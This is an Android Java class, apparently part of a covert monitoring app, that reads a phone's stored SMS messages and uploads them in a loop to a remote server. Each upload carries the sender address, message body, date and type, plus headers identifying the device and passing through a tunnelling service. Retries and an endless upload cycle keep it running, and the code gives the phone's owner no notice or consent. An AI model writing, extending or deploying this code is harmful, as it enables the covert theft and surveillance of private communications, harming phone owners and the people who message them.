package com.lurkerx.gpsjob.smsjob;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import okhttp3.*;

public class SmsUploader {

    private static final String TAG = "SmsUploader";

    public static void uploadLoop(Context context, String url) {
        SmsDatabaseHelper db = new SmsDatabaseHelper(context);
        OkHttpClient client = new OkHttpClient();
        long startTime = System.currentTimeMillis();
        long maxDuration = 5 * 60 * 1000;

        try {
            while (/*System.currentTimeMillis() - startTime < maxDuration*/ true) {
                JSONArray payload = new JSONArray();
                Cursor c = db.getUnsentSms(150);
                while (c.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("id", c.getLong(c.getColumnIndexOrThrow("_id")));
                    sms.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                    sms.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    sms.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                    sms.put("type", c.getString(c.getColumnIndexOrThrow("type")));
                    payload.put(sms);
                }
                c.close();

                Log.d(TAG, "Unsent SMS count: " + payload.length());

                if (payload.length() == 0) {
                    Log.d(TAG, "All SMS sent, idling upload loop");
                    Thread.sleep(10_000);
                    continue; //break;
                }

                boolean batchSent = false;
                int retryCount = 0;

                while (!batchSent && retryCount < 5) {
                    try {
                        RequestBody body = RequestBody.create(
                                payload.toString(),
                                MediaType.get("application/json; charset=utf-8")
                        );

                        Request request = new Request.Builder()
                                .url(url+ "/receive_data/sms")
                                .post(body)
                                .addHeader("Content-Type", "application/json")
                                .addHeader("C-Device", Build.MANUFACTURER + " " + Build.DEVICE +" " + Build.MODEL)
                                .addHeader("localtonet-skip-warning", "to-api")
                                .build();

                        Response response = client.newCall(request).execute();

                        if (response.isSuccessful()) {
                            for (int i = 0; i < payload.length(); i++) {
                                long id = payload.getJSONObject(i).getLong("id");
                                db.markSmsAsSent(id);
                            }
                            batchSent = true;
                            response.close();
                        } else {
                            Log.w(TAG, "Server error, code: " + response.code());
                            retryCount++;
                            response.close();
                            Thread.sleep(10_000);
                        }

                    } catch (Exception e) {
                        Log.e(TAG, "Network error, retrying batch", e);
                        retryCount++;
                        Thread.sleep(10_000);
                    }
                }

                if (!batchSent) {
                    Log.w(TAG, "Failed to upload batch after retries, moving to next cycle in 5mins");
                }
                Thread.sleep(5_000);
            }
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error in upload loop", e);
        } finally {
            Log.d(TAG, "Stopping SmsUploader");
        }
    }
}
